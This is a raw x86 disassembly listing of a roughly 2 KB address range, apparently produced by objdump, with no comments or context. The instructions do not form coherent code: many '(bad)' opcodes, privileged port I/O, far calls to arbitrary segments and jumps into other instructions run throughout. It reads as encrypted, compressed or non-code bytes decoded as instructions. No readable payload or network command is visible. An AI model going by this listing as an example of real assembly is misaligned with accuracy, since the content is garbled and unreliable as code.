  410f87:	add    eax,0x58e5a8ca
  410f8c:	jne    0x410f18
  410f8e:	mov    bh,0x87
  410f90:	rcr    DWORD PTR [edi+0x18],0x20
  410f94:	inc    ecx
  410f95:	jge    0x410fbd
  410f97:	(bad)  
  410f98:	adc    al,0xc
  410f9a:	sbb    DWORD PTR [edi-0x1b72f633],ebp
  410fa0:	clc    
  410fa1:	popa   
  410fa2:	push   edx
  410fa3:	and    DWORD PTR [ecx],esi
  410fa5:	sti    
  410fa6:	sub    al,0x5f
  410fa8:	push   ss
  410fa9:	out    dx,eax
  410faa:	adc    al,0x9b
  410fac:	dec    ecx
  410fad:	aam    0x42
  410faf:	jbe    0x410f3b
  410fb1:	rcl    BYTE PTR [esi],0xf8
  410fb4:	popa   
  410fb5:	mov    edi,0xba63e1f
  410fba:	bound  ebp,QWORD PTR [esi+0x22943634]
  410fc0:	js     0x410f63
  410fc2:	fs mov al,0x29
  410fc5:	das    
  410fc6:	push   ecx
  410fc7:	mov    ds:0x36eb5e20,eax
  410fcc:	sub    al,0xfe
  410fce:	shr    ebp,0x8f
  410fd1:	and    al,0xbd
  410fd3:	mov    WORD PTR [edi],cs
  410fd5:	in     al,dx
  410fd6:	call   0x79b2:0x54ae4d13
  410fdd:	jno    0x410f9f
  410fdf:	aaa    
  410fe0:	add    ch,0x54
  410fe3:	jecxz  0x411010
  410fe5:	adc    eax,0xbc24810a
  410fea:	outs   dx,BYTE PTR ds:[esi]
  410feb:	cmp    BYTE PTR [edx+0x43],dh
  410fee:	and    ebp,DWORD PTR [edx]
  410ff0:	add    dh,ch
  410ff2:	push   edi
  410ff3:	and    al,0x4f
  410ff5:	dec    ecx
  410ff6:	mov    ecx,0xb1978917
  410ffb:	dec    ecx
  410ffc:	pop    ebp
  410ffd:	and    edi,ebx
  410fff:	popf   
  411000:	xchg   BYTE PTR es:[esi+0x75],cl
  411004:	adc    DWORD PTR [edi+0x6b],esi
  411007:	fcmove st,st(1)
  411009:	jne    0x41104a
  41100b:	sub    eax,0xebf4025d
  411010:	or     BYTE PTR [ebx+0x2a4005c3],ch
  411016:	xchg   eax,eax
  411018:	aas    
  411019:	lahf   
  41101a:	xor    DWORD PTR [esi+0x72c4d7de],ecx
  411020:	imul   esi,esp,0xffffffd4
  411023:	aaa    
  411024:	loopne 0x410fe2
  411026:	jnp    0x4110a5
  411028:	sbb    al,0xbe
  41102a:	fs mov ah,0xd8
  41102d:	adc    eax,0x5c185541
  411032:	(bad)  
  411033:	iret   
  411034:	iret   
  411035:	mov    ebp,0x518b7456
  41103a:	lahf   
  41103b:	add    bh,BYTE PTR [esi-0x46]
  41103e:	(bad)  
  41103f:	jmp    0x3c449ecb
  411044:	icebp  
  411045:	fist   DWORD PTR ds:0xa17c08a6
  41104b:	inc    eax
  41104c:	mov    ds:0xb262e27c,al
  411051:	shl    BYTE PTR [esp+edx*4+0x3b],0xae
  411056:	jge    0x411032
  411058:	push   0x99854eac
  41105d:	outs   dx,BYTE PTR ds:[esi]
  41105e:	mov    ah,0x7d
  411060:	in     eax,0x7
  411062:	xchg   BYTE PTR [edx+0x1d],cl
  411065:	sbb    eax,0x4c3854b0
  41106a:	and    ebx,DWORD PTR [eax-0x4d5ed053]
  411070:	mov    bh,0x81
  411072:	cs pop es
  411074:	jns    0x4110ad
  411076:	out    0xad,al
  411078:	inc    ebp
  411079:	xor    dl,BYTE PTR [ebx+0x15623457]
  41107f:	bnd jg 0x4110b7
  411082:	sub    edx,0xb6b4b59c
  411088:	push   ebx
  411089:	in     eax,dx
  41108a:	push   esi
  41108b:	ret    
  41108c:	jp     0x41105b
  41108e:	add    BYTE PTR [ecx+0x71],bh
  411091:	ins    DWORD PTR es:[edi],dx
  411092:	fcomp  QWORD PTR [ecx+0x2a82aedf]
  411098:	or     eax,0x45ddd90f
  41109d:	shr    DWORD PTR ds:0xf5057320,cl
  4110a3:	and    ecx,DWORD PTR [esi-0x69]
  4110a6:	clc    
  4110a7:	xor    eax,0xb736f954
  4110ac:	mov    cl,0x12
  4110ae:	out    0xb3,eax
  4110b0:	mov    WORD PTR [edi-0x4d],?
  4110b3:	mov    eax,0xfa2f41db
  4110b8:	pop    es
  4110b9:	dec    ebp
  4110ba:	int    0x37
  4110bc:	sahf   
  4110bd:	dec    ecx
  4110be:	push   0x3e
  4110c0:	jns    0x411073
  4110c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110c4:	xor    eax,0x72adbf95
  4110c9:	jae    0x4110da
  4110cb:	sub    al,0x63
  4110cd:	mov    bl,bh
  4110cf:	xchg   BYTE PTR [ecx-0x39486a65],bh
  4110d5:	xchg   edi,eax
  4110d6:	jmp    0x41112a
  4110d8:	mov    edx,0x5dc00d1e
  4110dd:	push   ss
  4110de:	fst    DWORD PTR [ecx-0x36cf3e2e]
  4110e4:	imul   BYTE PTR [edx+0x1]
  4110e7:	idiv   DWORD PTR [eax+0x9831ce4]
  4110ed:	mov    ebx,edi
  4110ef:	dec    edi
  4110f0:	out    0x7d,eax
  4110f2:	dec    esp
  4110f3:	das    
  4110f4:	cmc    
  4110f5:	pop    edx
  4110f6:	dec    ecx
  4110f7:	and    DWORD PTR [ecx-0x3c],edx
  4110fa:	aaa    
  4110fb:	retf   0x2ad7
  4110fe:	loope  0x41111d
  411100:	les    ecx,FWORD PTR [edx+eax*1-0x41b7427a]
  411107:	ficomp WORD PTR [ebp-0x51]
  41110a:	push   edx
  41110b:	loopne 0x41114e
  41110d:	div    eax
  41110f:	push   es
  411110:	int    0xaf
  411112:	pusha  
  411113:	scas   eax,DWORD PTR es:[edi]
  411114:	shl    DWORD PTR [edx],0x6e
  411117:	jb     0x4110c9
  411119:	fs jl  0x41119a
  41111c:	ret    
  41111d:	push   esi
  41111e:	repz push eax
  411120:	sub    dh,BYTE PTR [ebp+0x5df9928d]
  411126:	sbb    DWORD PTR [eax-0x48],edi
  411129:	std    
  41112a:	aas    
  41112b:	popa   
  41112c:	in     al,dx
  41112d:	mov    edi,0x9e40d2bf
  411132:	or     al,bh
  411134:	stos   DWORD PTR es:[edi],eax
  411135:	lea    ecx,[eax+0x28]
  411138:	mov    ebx,0xa019eb79
  41113d:	les    edx,FWORD PTR [ecx]
  41113f:	jbe    0x4110dc
  411141:	push   ebx
  411142:	leave  
  411143:	clc    
  411144:	popa   
  411145:	push   ecx
  411146:	mov    dh,0xf4
  411148:	arpl   WORD PTR [ecx],sp
  41114a:	cmp    DWORD PTR [eax-0x5c],ecx
  41114d:	push   ebp
  41114e:	jbe    0x4111cd
  411150:	inc    ecx
  411151:	cmp    esp,DWORD PTR [edi+0x11]
  411154:	test   al,0x9a
  411156:	inc    eax
  411157:	mov    ds,WORD PTR [ebp-0x1104d75a]
  41115d:	push   ss
  41115e:	add    bh,bh
  411160:	es mov ch,0xe1
  411163:	add    esi,DWORD PTR [edx]
  411165:	pop    ds
  411166:	mov    DWORD PTR [esi+ebx*1],eax
  411169:	mov    ds:0xd5c04fdf,al
  41116e:	adc    eax,0x8d92c754
  411173:	sbb    BYTE PTR [esp],dl
  411176:	enter  0xe166,0x72
  41117a:	(bad)  [esi-0x67f700f2]
  411180:	mov    al,0x4e
  411182:	mov    al,0x6f
  411184:	sahf   
  411185:	retf   
  411186:	xor    DWORD PTR [ebp-0x72],esi
  411189:	xchg   ebx,eax
  41118a:	nop
  41118b:	dec    edx
  41118c:	add    BYTE PTR [esi],0x87
  41118f:	push   edi
  411190:	enter  0x617d,0xe2
  411194:	sub    esp,esi
  411196:	rcl    BYTE PTR [ebx-0x3acb11a3],1
  41119c:	push   esp
  41119d:	xor    bh,0xc0
  4111a0:	xchg   esp,eax
  4111a1:	jb     0x41118d
  4111a3:	or     al,0x8e
  4111a5:	call   0x986f:0xff490082
  4111ac:	nop
  4111ad:	dec    ecx
  4111ae:	lahf   
  4111af:	imul   edi,ebp,0xab982bd9
  4111b5:	(bad)  
  4111b6:	cmp    al,0xc0
  4111b8:	leave  
  4111b9:	(bad)  
  4111ba:	pop    esi
  4111bb:	push   ds
  4111bc:	xor    esp,esi
  4111be:	sbb    BYTE PTR [ecx],al
  4111c0:	(bad)
  4111c4:	stos   DWORD PTR es:[edi],eax
  4111c5:	inc    esp
  4111c6:	or     al,0xd1
  4111c8:	aas    
  4111c9:	push   0xffffff88
  4111cb:	dec    esi
  4111cc:	jo     0x411212
  4111ce:	or     al,0xf4
  4111d0:	ret    0x6515
  4111d3:	in     eax,0x81
  4111d5:	adc    DWORD PTR [eax+0x5a],eax
  4111d8:	sahf   
  4111d9:	sahf   
  4111da:	cwde   
  4111db:	pusha  
  4111dc:	call   0x864612cc
  4111e1:	cli    
  4111e2:	mov    ah,0x8c
  4111e4:	inc    edx
  4111e5:	or     eax,ebx
  4111e7:	inc    ebx
  4111e8:	mov    ebp,0xc13d8b09
  4111ed:	xchg   ebx,esp
  4111ef:	and    eax,0xbe007bed
  4111f4:	adc    bh,BYTE PTR [esi+0x49c49e39]
  4111fa:	inc    edx
  4111fb:	and    DWORD PTR [esi],ebx
  4111fd:	cmp    BYTE PTR ds:0x5e86457,ch
  411203:	xchg   edx,eax
  411204:	fucomi st,st(7)
  411206:	ss aam 0xcd
  411209:	std    
  41120a:	test   esi,esi
  41120c:	push   esp
  41120d:	xor    ah,BYTE PTR es:[eax-0x55d71063]
  411214:	sar    DWORD PTR [ecx-0x4f],1
  411217:	pop    esi
  411218:	sub    al,0xf9
  41121a:	scas   al,BYTE PTR es:[edi]
  41121b:	ja     0x4111cc
  41121d:	(bad)  
  41121e:	aam    0xc3
  411220:	dec    edx
  411221:	add    cl,ah
  411223:	stc    
  411224:	cmp    cl,dl
  411226:	pop    eax
  411227:	adc    eax,0xea6410ab
  41122c:	stc    
  41122d:	sar    DWORD PTR [edi+0x1e],1
  411230:	dec    esi
  411231:	jmp    0x24590316
  411236:	sar    DWORD PTR [ecx],cl
  411238:	jmp    0x5cf3883e
  41123d:	outs   dx,DWORD PTR ds:[esi]
  41123e:	lods   eax,DWORD PTR ds:[esi]
  41123f:	ja     0x4112ad
  411241:	xchg   ebx,ecx
  411243:	xor    DWORD PTR [ebp+0x24587a2c],eax
  411249:	push   ebx
  41124a:	lahf   
  41124b:	ficom  DWORD PTR [esi]
  41124d:	and    al,0xf8
  41124f:	jnp    0x41125d
  411251:	sub    edx,DWORD PTR [eax-0x66]
  411254:	dec    edi
  411255:	push   DWORD PTR [ebp+0x70]
  411258:	test   eax,esi
  41125a:	stc    
  41125b:	cmp    ah,0xf2
  41125e:	push   esi
  41125f:	cmc    
  411260:	loopne 0x4112b5
  411262:	push   cs
  411263:	cs mov edi,0x7952cc3c
  411269:	and    BYTE PTR [ebx-0x7f5c6f22],0xf1
  411270:	or     esi,DWORD PTR ds:0x2619df08
  411276:	cs sub eax,0xccc5bc3
  41127c:	add    al,0x90
  41127e:	iret   
  41127f:	and    edi,DWORD PTR [ebx+0x1d]
  411282:	std    
  411283:	xor    bl,BYTE PTR [esi-0x64]
  411286:	ins    BYTE PTR es:[edi],dx
  411287:	mov    bh,0x2c
  411289:	dec    ebx
  41128a:	adc    al,0xcf
  41128c:	push   ebp
  41128d:	xchg   DWORD PTR [ebp-0x3b71315],esi
  411293:	retf   0x50c2
  411296:	rcr    DWORD PTR [bx],0xcd
  41129a:	(bad)  
  41129b:	fnstenv [ebp+0x39]
  41129e:	mov    ds:0xcb7288b2,al
  4112a3:	std    
  4112a4:	sbb    eax,0xf15c912f
  4112a9:	push   es
  4112aa:	sahf   
  4112ab:	aad    0x11
  4112ad:	mov    ah,0x4
  4112af:	mov    DWORD PTR [ebp-0x51],ebx
  4112b2:	es sbb al,0x68
  4112b5:	dec    esi
  4112b6:	xchg   BYTE PTR [ebx-0x21aca00],cl
  4112bc:	(bad)  
  4112bd:	in     al,dx
  4112be:	pop    esp
  4112bf:	xchg   esi,eax
  4112c0:	adc    esp,DWORD PTR [ebp+0x61]
  4112c3:	jne    0x4112d7
  4112c5:	sbb    DWORD PTR ds:0x7ca5d0ff,esp
  4112cb:	(bad)  
  4112cd:	das    
  4112ce:	(bad)  
  4112cf:	adc    DWORD PTR [ebp+0x53],edx
  4112d2:	xchg   ebp,eax
  4112d3:	xchg   ecx,eax
  4112d4:	jmp    0x9ef5e74a
  4112d9:	jg     0x4112c8
  4112db:	jecxz  0x41128b
  4112dd:	aas    
  4112de:	lods   al,BYTE PTR ds:[esi]
  4112df:	adc    bl,BYTE PTR [eax-0x53]
  4112e2:	sbb    eax,0xe9f77d43
  4112e7:	and    DWORD PTR [edi],ebx
  4112e9:	mov    cl,0x77
  4112eb:	out    0x6,al
  4112ed:	addr16 mov edx,0xa1b5c118
  4112f3:	jo     0x4112ef
  4112f5:	xchg   esi,edx
  4112f7:	repnz out dx,eax
  4112f9:	mov    eax,0x30918716
  4112fe:	in     al,dx
  4112ff:	rol    bh,0xde
  411302:	shr    dh,cl
  411304:	adc    eax,0x85fa4997
  411309:	push   ecx
  41130a:	outs   dx,DWORD PTR ds:[esi]
  41130b:	mov    BYTE PTR [esi+0x4ba79c5c],ah
  411311:	fst    QWORD PTR [esi]
  411313:	inc    edx
  411314:	and    edi,DWORD PTR [ebx+eiz*2-0x55]
  411318:	hlt    
  411319:	inc    esi
  41131a:	popf   
  41131b:	push   ss
  41131c:	fld    DWORD PTR [ecx]
  41131e:	jl     0x4112d3
  411320:	dec    eax
  411321:	sbb    al,ah
  411323:	jg     0x4112fd
  411325:	repnz das 
  411327:	jge    0x4113a5
  411329:	mov    ds:0x437832b0,al
  41132e:	and    esi,eax
  411330:	adc    ch,BYTE PTR [ebx+0x4d5e97aa]
  411336:	outs   dx,DWORD PTR ds:[esi]
  411337:	out    dx,eax
  411338:	mov    esp,0x4b945f86
  41133d:	push   esi
  41133e:	addr16 jb 0x411377
  411341:	mov    edi,0xe8a2fcc3
  411346:	jp     0x4113c3
  411348:	out    dx,eax
  411349:	fs into 
  41134b:	pop    ebx
  41134c:	fcomp  DWORD PTR [esi-0x6eafb32d]
  411352:	inc    ebx
  411353:	xlat   BYTE PTR ss:[ebx]
  411355:	mov    ds:0x58851dc9,al
  41135a:	lock dec esp
  41135c:	fdivr  st(5),st
  41135e:	mov    edi,0x64b25153
  411363:	jb     0x4112f3
  411365:	push   es
  411366:	outs   dx,BYTE PTR ds:[esi]
  411367:	mov    ebp,0x38473ef0
  41136c:	cmp    BYTE PTR [eax+0x1a],dh
  41136f:	cld    
  411370:	std    
  411371:	pop    ds
  411372:	ds push cs
  411374:	daa    
  411375:	stos   DWORD PTR es:[edi],eax
  411376:	fsubr  DWORD PTR [esi+0x7963cf9d]
  41137c:	mov    bh,0xcf
  41137e:	(bad)  
  411380:	xchg   BYTE PTR [esi-0x20f6fe57],ah
  411386:	push   es
  411387:	cdq    
  411388:	push   es
  411389:	(bad)  
  41138a:	fnstcw WORD PTR [eax-0x5e136c7a]
  411390:	mov    edi,0x95b48120
  411395:	popf   
  411396:	loopne 0x41139a
  411398:	punpckhdq mm2,mm7
  41139b:	lea    esi,[ebp+0x53]
  41139e:	jne    0x4113d0
  4113a0:	xchg   ebx,eax
  4113a1:	mov    esi,0x45452443
  4113a6:	mov    bh,0x93
  4113a8:	cmp    al,0xdd
  4113aa:	mov    dl,0x99
  4113ac:	add    bl,BYTE PTR [edx-0x15]
  4113af:	je     0x41136d
  4113b1:	shl    BYTE PTR [esi+ebp*1-0x4438f443],1
  4113b8:	(bad)  
  4113b9:	pop    ecx
  4113ba:	push   ebp
  4113bb:	shl    DWORD PTR [esi],0xbb
  4113be:	add    esp,DWORD PTR [edi-0x30]
  4113c1:	sbb    dl,bh
  4113c3:	std    
  4113c4:	pop    esi
  4113c5:	loop   0x4113b6
  4113c7:	sbb    DWORD PTR [ecx+0x12],ebp
  4113ca:	jg     0x4113f5
  4113cc:	adc    ah,BYTE PTR ds:0x5d4d71d1
  4113d2:	sbb    dl,BYTE PTR [ecx]
  4113d4:	dec    ecx
  4113d5:	mov    eax,ds:0xb98134e1
  4113da:	cmp    cl,BYTE PTR [ebp-0x4b47ab4a]
  4113e0:	lods   eax,DWORD PTR ds:[esi]
  4113e1:	sbb    ch,BYTE PTR [esi+0x3c]
  4113e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113e5:	pop    esp
  4113e6:	and    esp,ecx
  4113e8:	pop    eax
  4113e9:	in     eax,dx
  4113ea:	pop    ecx
  4113eb:	scas   eax,DWORD PTR es:[edi]
  4113ec:	retf   0x95ed
  4113ef:	jb     0x4113cf
  4113f1:	dec    eax
  4113f2:	iret   
  4113f3:	js     0x4113fc
  4113f5:	nop
  4113f6:	add    cl,BYTE PTR [ebp+0x65]
  4113f9:	cs hlt 
  4113fb:	pop    ss
  4113fc:	in     al,dx
  4113fd:	xchg   esi,eax
  4113fe:	pop    eax
  4113ff:	mov    edi,0xc17cef6d
  411404:	sub    eax,0x3714706
  411409:	test   al,0x3e
  41140b:	dec    edi
  41140c:	pop    esi
  41140d:	hlt    
  41140e:	inc    ebp
  41140f:	and    BYTE PTR [edi-0x47],ch
  411412:	(bad)  
  411413:	mov    dl,0xc1
  411415:	nop
  411416:	cmp    cl,cl
  411418:	add    ah,0x4d
  41141b:	pop    ss
  41141c:	dec    ebx
  41141d:	sbb    ebp,DWORD PTR [ebx+0x64]
  411420:	ror    BYTE PTR [ebx],cl
  411422:	adc    DWORD PTR [edi],esi
  411424:	xchg   ebx,eax
  411425:	mov    edi,0xc0c7c6b9
  41142a:	jns    0x411402
  41142c:	(bad)  
  41142d:	call   0xefe7:0xda0a0888
  411434:	mov    ecx,0x180fd2c3
  411439:	jecxz  0x4113bb
  41143b:	leave  
  41143c:	dec    esi
  41143d:	out    0xeb,al
  41143f:	cmp    edi,eax
  411441:	and    al,0x62
  411443:	aam    0xe5
  411445:	sub    al,0xd2
  411447:	div    BYTE PTR [esi-0x63]
  41144a:	lock or al,0xb0
  41144d:	mov    bh,0xf5
  41144f:	jno    0x4114c4
  411451:	xchg   BYTE PTR [ecx],ch
  411453:	xor    BYTE PTR [edx-0x60],0x18
  411457:	shr    BYTE PTR [eax],cl
  411459:	push   0x489c7344
  41145e:	jnp    0x411442
  411460:	icebp  
  411461:	jmp    0x4987:0xb5250184
  411468:	mov    ds:0xe385705d,al
  41146d:	mov    al,ds:0xbb062f3d
  411472:	xchg   DWORD PTR [eax+0x7a],edx
  411475:	in     al,0xbf
  411477:	popa   
  411478:	jno    0x41143e
  41147a:	mov    esi,0x97175057
  41147f:	in     al,dx
  411480:	push   ecx
  411481:	les    ecx,FWORD PTR [esi+0x2debf333]
  411487:	xor    eax,0x885df336
  41148c:	mov    esp,0xc838921d
  411491:	std    
  411492:	pop    ebx
  411493:	jmp    0x411416
  411495:	mov    ebx,esp
  411497:	xchg   edx,eax
  411498:	jb     0x411449
  41149a:	cdq    
  41149b:	les    edi,FWORD PTR [ebx]
  41149d:	(bad)  [eax]
  41149f:	mov    bl,dh
  4114a1:	out    dx,eax
  4114a2:	enter  0xc57e,0x5d
  4114a6:	fwait
  4114a7:	loopne 0x411463
  4114a9:	xchg   DWORD PTR [edx-0x49c8e76b],edi
  4114af:	xchg   ebx,eax
  4114b0:	popf   
  4114b1:	ror    DWORD PTR ds:0x611d51b5,0x7b
  4114b8:	retf   
  4114b9:	loope  0x411486
  4114bb:	(bad)  
  4114bc:	outs   dx,DWORD PTR ds:[esi]
  4114bd:	xchg   ecx,edx
  4114bf:	xor    eax,0xb931f2b2
  4114c4:	dec    esp
  4114c5:	loopne 0x4114fa
  4114c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114c8:	jae    0x4114fe
  4114ca:	out    dx,al
  4114cb:	inc    ebp
  4114cc:	ret    0x8720
  4114cf:	leave  
  4114d0:	addr16 sar ebp,cl
  4114d3:	mov    bl,cl
  4114d5:	das    
  4114d6:	ret    0xfff6
  4114d9:	and    eax,DWORD PTR [ebx]
  4114db:	hlt    
  4114dc:	idiv   DWORD PTR [ebx]
  4114de:	xor    DWORD PTR [edx+0x65],esi
  4114e1:	xchg   ebp,eax
  4114e2:	hlt    
  4114e3:	loopne 0x41146e
  4114e5:	cld    
  4114e6:	or     ah,dh
  4114e8:	cli    
  4114e9:	push   esi
  4114ea:	sbb    eax,0x9632a70
  4114ef:	dec    esi
  4114f0:	xor    cl,ah
  4114f2:	mov    ds:0x22fd04f3,eax
  4114f7:	imul   eax,DWORD PTR [eax-0x191f2015],0x871dfd3a
  411501:	mov    ebx,0x3e7e606b
  411506:	sub    edi,DWORD PTR [ebx+ebx*4+0x7f]
  41150a:	out    0x6e,al
  41150c:	(bad)  
  41150d:	sbb    eax,0x953dd285
  411512:	cli    
  411513:	ja     0x411575
  411515:	rol    BYTE PTR [ebp+0x58fd5a71],cl
  41151b:	jmp    0x70bc9850
  411520:	outs   dx,BYTE PTR ds:[esi]
  411521:	jg     0x411551
  411523:	cld    
  411524:	imul   ebp,edi,0xb62bb4c
  41152a:	outs   dx,BYTE PTR ds:[esi]
  41152b:	es rcr ebp,0x7b
  41152f:	mov    esp,0x603b788e
  411534:	mov    ds:0xab7ff440,eax
  411539:	or     al,0x94
  41153b:	mov    ebp,0x948fcf46
  411540:	or     al,0x6a
  411542:	or     ebx,DWORD PTR [ecx-0x8f7aeb2]
  411548:	into   
  411549:	lea    edi,[ebx]
  41154b:	clc    
  41154c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154d:	or     DWORD PTR [esi],edx
  41154f:	pop    DWORD PTR ds:0x5fbba34e
  411555:	cmp    dl,BYTE PTR [ebx+0x2f]
  411558:	imul   esi,DWORD PTR [esi+esi*2+0x59],0x3a630edd
  411560:	lea    ebx,[eax+0x7e]
  411563:	or     DWORD PTR [ebx],eax
  411565:	frstpm(287 only) 
  411567:	inc    edx
  411568:	shl    DWORD PTR [edi+0x6c879a05],1
  41156e:	mov    DWORD PTR ds:0x42158acd,0xa27dff85
  411578:	sub    edi,ebx
  41157a:	call   0x7efe:0xa4b0bc11
  411581:	cmp    eax,0x5122ef7a
  411586:	lods   al,BYTE PTR ds:[esi]
  411587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411588:	neg    ebp
  41158a:	jl     0x411566
  41158c:	(bad)  
  41158e:	aam    0xff
  411590:	cmp    BYTE PTR [edi-0x5e7e80d8],0x7
  411597:	in     al,0x4f
  411599:	jae    0x411619
  41159b:	jge    0x411550
  41159d:	inc    edx
  41159e:	enter  0xd378,0xef
  4115a2:	into   
  4115a3:	(bad)  [ecx-0x6c]
  4115a6:	mov    al,ds:0xf139b2c
  4115ab:	dec    ebp
  4115ac:	mov    al,ds:0x42e43887
  4115b1:	dec    edi
  4115b2:	xchg   esp,eax
  4115b3:	mov    eax,0xda596b0f
  4115b8:	mov    ebx,0x7a3c8618
  4115bd:	retf   
  4115be:	adc    DWORD PTR [ecx-0x4dc107c0],esi
  4115c4:	imul   ebx,DWORD PTR [edi],0x5e
  4115c7:	pop    edi
  4115c8:	ds add eax,0xa623f410
  4115ce:	stos   BYTE PTR es:[edi],al
  4115cf:	pusha  
  4115d0:	aaa    
  4115d1:	je     0x411578
  4115d3:	add    al,0x26
  4115d5:	aaa    
  4115d6:	(bad)  
  4115d7:	cld    
  4115d8:	add    DWORD PTR [eax+0x14fe675a],edi
  4115de:	mov    al,ds:0x4a42356a
  4115e3:	add    DWORD PTR [edi-0x52c40a1d],0x348ac1bc
  4115ed:	lods   eax,DWORD PTR ds:[esi]
  4115ee:	sbb    al,0x66
  4115f0:	inc    ebx
  4115f1:	fwait
  4115f2:	ja     0x41162b
  4115f4:	xor    edi,ecx
  4115f6:	fbld   TBYTE PTR [ebx-0x3]
  4115f9:	mov    dh,0x9d
  4115fb:	loope  0x4115ee
  4115fd:	out    0x12,eax
  4115ff:	rol    ebp,0xf1
  411602:	pop    edi
  411603:	push   ds
  411604:	dec    esi
  411605:	adc    al,0x6e
  411607:	inc    ebx
  411608:	jg     0x411608
  41160a:	sub    ecx,DWORD PTR [eax+0x67]
  41160d:	inc    esi
  41160e:	loopne 0x41165c
  411610:	cli    
  411611:	je     0x41166b
  411613:	pop    edi
  411614:	mov    edi,0xb091294b
  411619:	into   
  41161a:	dec    esi
  41161b:	sahf   
  41161c:	(bad)  
  41161d:	test   al,0x6d
  41161f:	mov    ebx,0x3d59f12f
  411624:	dec    esp
  411625:	repz push esp
  411627:	jge    0x411670
  411629:	xchg   esp,eax
  41162a:	add    BYTE PTR [eax+eiz*4-0x7cc676ae],bl
  411631:	cmp    ch,0xb6
  411634:	dec    edx
  411635:	jg     0x411610
  411637:	stos   BYTE PTR es:[edi],al
  411638:	and    BYTE PTR [esi+0x15],dh
  41163b:	mov    edx,0x2b413833
  411640:	mov    bh,0xd0
  411642:	jge    0x411678
  411644:	xor    DWORD PTR [ebx-0x6123ac2f],edx
  41164a:	pop    ds
  41164b:	jl     0x411626
  41164d:	cmc    
  41164e:	push   esi
  41164f:	(bad)
  411653:	(bad)  
  411655:	das    
  411656:	pop    ebp
  411657:	rol    cl,1
  411659:	push   esp
  41165a:	in     eax,dx
  41165b:	mov    ah,0xe9
  41165d:	(bad)  
  41165e:	icebp  
  41165f:	xor    BYTE PTR [ebp+0x58],ch
  411662:	mov    cl,0x36
  411664:	dec    esp
  411665:	or     dh,BYTE PTR [ebp-0x60]
  411668:	cli    
  411669:	or     BYTE PTR [ebp+0x6d152192],cl
  41166f:	(bad)  
  411670:	xlat   BYTE PTR ds:[ebx]
  411671:	add    eax,0xdf3e1e3d
  411676:	inc    edx
  411677:	dec    ecx
  411678:	adc    eax,ebx
  41167a:	jo     0x411603
  41167c:	pop    edi
  41167d:	inc    eax
  41167e:	sbb    bh,BYTE PTR [esi]
  411680:	lods   eax,DWORD PTR ds:[esi]
  411681:	push   ss
  411682:	(bad)  
  411683:	stos   DWORD PTR es:[edi],eax
  411684:	push   esp
  411685:	jb     0x4116a9
  411687:	dec    esp
  411688:	sub    al,0x30
  41168a:	inc    ebp
  41168b:	pop    ebp
  41168c:	dec    ebp
  41168d:	lea    eax,ds:0x46def3fe
  411693:	nop
  411694:	jo     0x411619
  411696:	mov    edi,0xbab8db99
  41169b:	xchg   edi,eax
  41169c:	(bad)  
  41169d:	ins    BYTE PTR es:[edi],dx
  41169e:	adc    DWORD PTR [ecx-0x5beb53fd],esi
  4116a4:	shl    BYTE PTR [edx+0x25],1
  4116a7:	jge    0x411654
  4116a9:	aam    0x63
  4116ab:	(bad)  
  4116ac:	xchg   ecx,eax
  4116ad:	mov    eax,0x6573070e
  4116b2:	mov    ds:0x94b5caa6,al
  4116b7:	scas   eax,DWORD PTR es:[edi]
  4116b8:	push   0xdd0974ec
  4116bd:	cmp    DWORD PTR [ecx],ecx
  4116bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c0:	mov    dl,0x76
  4116c2:	push   edx
  4116c3:	(bad)  
  4116c4:	mov    ecx,0x11441a17
  4116c9:	pusha  
  4116ca:	jg     0x41170c
  4116cc:	ins    BYTE PTR es:[edi],dx
  4116cd:	and    eax,edx
  4116cf:	cwde   
  4116d0:	inc    esp
  4116d1:	mov    ds:0x33c86039,eax
  4116d6:	pop    es
  4116d7:	mov    edi,0x84f183ea
  4116dc:	mov    eax,0x3afad6c1
  4116e1:	and    DWORD PTR [eax-0x7e],ebx
  4116e4:	fidiv  DWORD PTR [edx-0x25]
  4116e7:	call   0x72fc:0x8e7443fe
  4116ee:	aam    0xb
  4116f0:	mov    eax,0xe3dc6820
  4116f5:	mov    eax,0x9d8c22cc
  4116fa:	pusha  
  4116fb:	das    
  4116fc:	ins    BYTE PTR es:[edi],dx
  4116fd:	sti    
  4116fe:	adc    eax,DWORD PTR [ecx+ebp*2-0x48ec1c07]
  411705:	push   es
  411706:	dec    esp
  411707:	xor    al,0x83
  411709:	sti    
  41170a:	loop   0x411723
  41170c:	sbb    ch,ch
  41170e:	pop    edx
  41170f:	ds push edi
  411711:	bound  esi,QWORD PTR [esi+0x72fd5e0a]
  411717:	stos   BYTE PTR es:[edi],al
  411718:	add    BYTE PTR ds:0x58c4ec54,dh
  41171e:	sub    ecx,DWORD PTR [edi-0x1a]
  411721:	int    0xc6
  411723:	mov    ah,0x71
  411725:	ror    BYTE PTR [ecx],cl
  411727:	push   0x7a
  411729:	stc    
  41172a:	xchg   esp,eax
  41172b:	adc    al,0x98
  41172d:	and    DWORD PTR [edi],esp
  41172f:	xor    ebx,DWORD PTR [eax*1-0x619d28a0]
  411736:	inc    edx
  411737:	leave  
  411738:	ins    BYTE PTR es:[edi],dx
  411739:	clc    
  41173a:	std    
  41173b:	(bad)  
  41173c:	ret    0x28e1
  41173f:	fimul  DWORD PTR [edi+0x62]
  411742:	adc    edi,DWORD PTR [ebx-0x7cd2e6cb]
  411748:	mov    ah,0x3c
  41174a:	(bad)  
  41174b:	jg     0x411775
  41174d:	jb     0x411766
  41174f:	call   0xdbf2:0xaab1b5b3
  411756:	jge    0x4117ad
  411758:	mov    BYTE PTR [esi-0x4d],ah
  41175b:	nop
  41175c:	mov    ah,0x5b
  41175e:	add    eax,0xa398f7c
  411763:	sbb    eax,DWORD PTR [ebx]
  411765:	push   ss
  411766:	icebp  
  411767:	or     ah,bh
  411769:	icebp  
  41176a:	inc    esi
  41176b:	repz and DWORD PTR [bx+di+0x5a66],edx
  411771:	stc    
  411772:	call   0x9c62033
  411777:	mov    edx,0x27f6cb4f
  41177c:	arpl   sp,cx
  41177e:	cmp    DWORD PTR [eax],esp
  411780:	jmp    0x41177e
  411782:	and    BYTE PTR [esi],bh
  411784:	clc    
